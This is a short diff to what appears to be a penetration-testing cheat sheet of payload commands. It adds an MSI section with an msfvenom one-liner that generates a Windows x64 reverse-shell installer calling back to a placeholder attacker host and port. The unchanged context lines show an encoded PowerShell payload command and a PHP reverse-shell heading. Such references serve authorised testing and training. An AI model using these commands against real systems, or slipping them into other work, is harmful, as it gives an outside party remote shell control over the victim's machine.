@@ -96,6 +96,8 @@ start webserver
 powershell -enc payload.b64
 ```
 
+MSI
+`msfvenom -p windows/x64/shell_reverse_tcp lhost=ipaddress lport=port -f msi -o reverse.msi`
 # PHP
 
 Pentest Monkey
